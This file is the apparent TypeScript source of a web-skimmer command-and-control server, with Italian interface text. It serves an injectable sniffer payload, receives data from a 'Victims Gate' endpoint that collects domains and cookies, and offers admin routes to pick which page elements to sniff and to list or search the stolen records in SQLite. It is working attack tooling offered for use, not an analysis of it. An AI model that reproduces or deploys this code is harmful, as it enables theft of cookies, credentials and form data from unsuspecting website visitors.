import * as http from "http";
import * as express from "express"
import * as bodyParser from "body-parser";
import * as cors from "cors";
import * as fs from "fs";
import * as sqlite3 from 'sqlite3';
import * as body from 'express-validator';
import {Generator} from "./modules/generator";
import {Logger} from "./modules/logger";
import {Loader} from "./modules/loader";
const app = express();
export class App {
  public conf:any;
  private logger:Logger;
  public generator:Generator;
  public loader:Loader;
  public eccipient: any;
  public expose: any;
  public detectedIp: any;
  public salty: String;
  public contain: any;
  public db: any = new sqlite3.Database('./history.db');
    constructor() {
        this.logger = new Logger();
        this.generator = new Generator();
        this.loader = new Loader();
        this.loader.bannerMessage();
        this.detectedIp = this.loader.findIp();
        app.use(cors());
        app.use(bodyParser.urlencoded({
            extended: false
        }));
         app.use(bodyParser.json());
            fs.readFile('./config.json', "utf8", (err, jsonString) => {
              if (err) throw err;
                this.conf = JSON.parse(jsonString);
                console.log('[!] Instance User:'+this.conf.instanceUser);
                console.log('[!] License Key:'+this.conf.licenseKey);
                this.salty=""+this.conf.instanceUser;
                this.bringevil();
                this.logger.initDb();
                this.start(this.conf.port,this.detectedIp);
            });
    }
    public bringevil(): void{
      this.generator.populate(JSON.parse(fs.readFileSync('./config.json', 'utf8')),this.salty);
      this.eccipient = this.generator.init();
      this.expose = this.generator.endpoint();
    }
    private start(x:any,y:any): void {
        app.get('/'+this.salty,(req,res)=>{
          res.send(this.eccipient);
        });
        app.get('/'+this.conf.licenseKey+'/status',(req,res)=>{
          let commonids='';
          let commontags='';
          let commonclasses='';
          this.conf.documentids.forEach((id)=>{
            commonids +='\''+id+'\','
          });
          this.conf.documentclasses.forEach((id)=>{
            commonclasses +='\''+id+'\','
          });
          this.conf.documenttags.forEach((id)=>{
            commontags +='\''+id+'\','
          });
          res.send(`<style>
                               table {
                                 font-family: arial, sans-serif;
                                 border-collapse: collapse;
                                 width:500px;
                               }
                               td, th {
                                 border: 1px solid #dddddd;
                                 text-align: left;
                                 padding: 8px;
                               }
                               tr {
                                 background-color: #dddddd;
                               }
                           </style>
                           <h2>STATUS Page</h2>
                           <table>
                           <thead>
                           <tr>
                           <th>Parametri</th>
                           <th>Status</th>
                           </tr>
                           <tr>
                           </thead>
                           <tbody>
                           <td>User</td>
                           <td>`+this.conf.instanceUser+`</td>
                           </tr>
                           <tr>
                           <td>Port</td>
                           <td>`+this.conf.port+`</td>
                           </tr>
                           <tr>
                           <td>Timer Polling</td>
                           <td>`+this.conf.polling+`</td>
                           </tr>
                           <tr>
                           <td>Sniffer Core</td>
                           <td>`+this.detectedIp+':'+this.conf.port+'/'+this.salty+`</td>
                           </tr>
                           <tr>
                           <td>Victims Gate</td>
                           <td>`+this.detectedIp+':'+this.conf.port+'/gate'+`</td>
                           </tr>
                           <tr>
                           <td>HTML Ids</td>
                           <td>`+commonids.slice(0,-1)+`</td>
                           </tr>
                           <tr>
                           <td>HTML Classes</td>
                           <td>`+commonclasses.slice(0,-1)+`</td>
                           </tr>
                           <tr>
                           <td>Tags</td>
                           <td>`+commontags.slice(0,-1)+`</td>
                           </tr>
                           <tr>
                           <td>Website Payload (Server-Side)</td>
                           <td>`+'<xmp>'+this.expose+'</xmp>'+`</td>
                           </tr>
                          </tbody>
                           </table>
                   `)
                   res.end();
        });
        app.get('/'+this.conf.licenseKey+'/help',(req,res)=>{
          res.send(`<style>
                      table {
                        font-family: arial, sans-serif;
                        border-collapse: collapse;
                        width: 100%;
                      }
                      td, th {
                        border: 1px solid #dddddd;
                        text-align: left;
                        padding: 8px;
                      }
                      tr:nth-child(even) {
                        background-color: #dddddd;
                      }
                  </style>
                  <h2>HELP Page</h2>
                  <table>
                  <tr>
                  <th>Restapi Link</th>
                  <th>Descrizione</th>
                  </tr>
                  <tr>
                  <td>/licenseKey/help</td>
                  <td>Ritorna questa pagina</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/status</td>
                  <td>Visualizza una panoramica dei parametri</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/restart</td>
                  <td>Riavvia il server</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/tags/add/nometag</td>
                  <td>Aggiunge un nuovo tag html sniffabile</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/ids/add/nomeid</td>
                  <td>Aggiunge un nuovo id html sniffabile</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/classes/add/nomeclasse</td>
                  <td>Aggiunge una nuova classe html sniffabile</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/tags/remove/nometag</td>
                  <td>Rimuove un tag html precedentemente impostato</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/ids/remove/nomeid</td>
                  <td>Rimuove un id html precedentemente impostato</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/classes/remove/nomeclasse</td>
                  <td>Rimuove una classe html precedentemente impostata</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/polling/modify/num</td>
                  <td>Modifica il tempo di comunicazione in secondi dello sniffer</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/info/list</td>
                  <td>Ritorna uno storico riguardante i dati sniffati sui vari siti a cui è collegato</td>
                  </tr>
                  <tr>
                  <tr>
                  <td>/licenseKey/session/list</td>
                  <td>Ritorna uno storico riguardante le operazioni di sniff sui vari siti a cui è collegato</td>
                  </tr>
                  <tr>
                  <tr>
                  <td>/licenseKey/search/info</td>
                  <td>Ritorna uno storico riguardante i chunks di sniff sui vari siti relativi al dominio cercato</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/db/clear</td>
                  <td>Cancella lo storico relativo alle operazioni di sniff sui vari siti a cui è collegato</td>
                  </tr>
                  </table>`);
        res.end();
        });
        app.get('/'+this.conf.licenseKey+'/restart',(req,res)=>{
             this.db.close();
	           process.exit(1);
             res.end();
        });
        app.get('/'+this.conf.licenseKey+'/tags/add/:tagname',(req,res)=>{
          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
          if (content.documenttags.indexOf(req.params.tagname) > -1){
            res.send(`<h2> HTML Tag Già presente </h2>`);
            res.end();
          } else {
            content.documenttags.push(req.params.tagname);
            res.send(`<h2> HTML Tag Aggiunto </h2>`);
            fs.writeFileSync('./config.json', JSON.stringify(content));
            this.bringevil();
            this.conf = JSON.parse(fs.readFileSync('./config.json', 'utf8'))
            res.end();
          }
        });
        app.get('/'+this.conf.licenseKey+'/tags/remove/:tagname',(req,res)=>{
          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
          if (content.documenttags.indexOf(req.params.tagname) > -1) {
           content.documenttags.splice(content.documenttags.indexOf(req.params.tagname), 1);
           fs.writeFileSync('./config.json', JSON.stringify(content));
           this.conf = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
           this.bringevil();
           res.send(`<h2> HTML Tag Rimosso </h2>`);
           res.end();
         } else {
           res.send(`<h2> HTML Tag Non presente </h2>`);
           res.end();
         }
        });
        app.get('/'+this.conf.licenseKey+'/ids/add/:idname',(req,res)=>{
          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
          if (content.documentids.indexOf(req.params.idname) > -1){
            res.send(`<h2> HTML ID Già presente </h2>`);
            res.end();
          } else {
            content.documentids.push(req.params.idname);
            res.send(`<h2> HTML ID Aggiunto </h2>`);
            fs.writeFileSync('./config.json', JSON.stringify(content));
            this.bringevil();
            res.end();
          }
        });
        app.get('/'+this.conf.licenseKey+'/ids/remove/:idname',(req,res)=>{
          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
          if (content.documentids.indexOf(req.params.idname) > -1) {
           content.documentids.splice(content.documentids.indexOf(req.params.idname), 1);
           fs.writeFileSync('./config.json', JSON.stringify(content));
           this.conf = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
           this.bringevil();
           res.send(`<h2> HTML Id Rimosso </h2>`);
           res.end();
         } else {
           res.send(`<h2> HTML Id Non presente </h2>`);
           res.end();
         }
        });
        app.get('/'+this.conf.licenseKey+'/classes/add/:classname',(req,res)=>{
          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
          let x = req.params.classname.replace(/{}<>/g,'')
          if (content.documentclasses.indexOf(x) > -1){
            res.send(`<h2> HTML Class Già presente </h2>`);
            res.end();
          } else {
            res.send(`<h2> HTML Tag Aggiunto </h2>`);
            content.documentclasses.push(x);
            fs.writeFileSync('./config.json', JSON.stringify(content));
            this.conf = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
            this.bringevil();
            res.end();
          }
        });
        app.get('/'+this.conf.licenseKey+'/classes/remove/:classname',(req,res)=>{
          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
          if (content.documentclasses.indexOf(req.params.classname) > -1) {
           content.documentclasses.splice(content.documentclasses.indexOf(req.params.classname), 1);
           fs.writeFileSync('./config.json', JSON.stringify(content));
           this.conf = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
           this.bringevil();
           res.send(`<h2> HTML Class Rimosso </h2>`);
           res.end();
         } else {
           res.send(`<h2> HTML Class Non presente </h2>`);
           res.end();
         }
        });
        app.get('/'+this.conf.licenseKey+'/polling/modify/:interval',(req,res)=>{
            let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
            content.polling = req.params.interval;
            fs.writeFileSync('./config.json', JSON.stringify(content));
            this.conf = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
            this.bringevil();
            res.send(`<h2> Timer Polling Aggiornato </h2>`);
            res.end();
        });
        app.get('/'+this.conf.licenseKey+'/session/list',(req,res)=>{
            const sql = "SELECT * FROM session";
            this.db.all(sql, [], function(err, rows) {
              if (err) {
                console.log(err);
              }
              res.json({
                         "message":"success",
                         "data":rows
                     });
              });
        });
        app.get('/'+this.conf.licenseKey+'/info/list',(req,res)=>{
          const sql = "SELECT * FROM info";
          this.db.all(sql, [], function(err, rows) {
            if (err) {
              console.log(err);
            }
            res.json({
                       "message":"success",
                       "data":rows
                   });
            });
        });
        app.get('/'+this.conf.licenseKey+'/db/clear',(req,res)=>{
          const sql = "DELETE * FROM info ";
          this.db.all(sql, function(err) {
            if (err) {
              res.send('No result found');
            }
            res.json({
                       "message":"success",
                   });
            });
        });
        app.get('/'+this.conf.licenseKey+'/search/info/:keywordname',(req,res)=>{
          const sql = "SELECT * FROM info WHERE address=? ";
          this.db.all(sql, [req.params.keywordname], function(err, rows) {
            if (err) {
              res.send('No result found');
            }
            res.json({
                       "message":"success",
                       "data":rows
                   });
            });
        });
        app.post('/gate',(req,res)=>{
          if (req.body.domain === null && req.body.cookie === null){
            this.logger.alertMessage(req);
          } else {
            this.logger.writeLogs(req.body);
          }
            res.status(200);
            res.end();
         });
        const web = http.createServer(app);
        web.listen(x,y , () => {
          console.log('[!] Server Status ON with '+`PID: ${process.pid}`+' Given IP Addr:'+this.detectedIp+':'+this.conf.port);
        });
    }
}
export default new App();
